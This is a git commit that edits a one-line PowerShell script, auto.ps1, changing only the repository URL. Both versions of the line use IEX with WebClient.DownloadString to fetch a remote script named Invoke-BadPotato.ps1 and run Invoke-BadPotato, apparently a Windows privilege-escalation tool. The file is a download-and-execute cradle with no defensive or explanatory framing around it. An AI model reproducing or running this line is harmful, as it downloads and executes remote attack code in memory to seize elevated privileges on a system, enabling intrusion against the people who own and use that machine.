448b05da6faeb3ce43d8bb04744a5d3c5dd1c8f9
cangaruu <50958708+cangaruu@users.noreply.github.com>
2024-07-25 22:25:54 -0600

    Update auto.ps1

--- auto.ps1
+++ auto.ps1
@@ -1,1 +1,1 @@
-IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/cangaruu/testing/main/Invoke-BadPotato.ps1');Invoke-BadPotato
+IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/cangaruu/DT/main/Invoke-BadPotato.ps1');Invoke-BadPotato
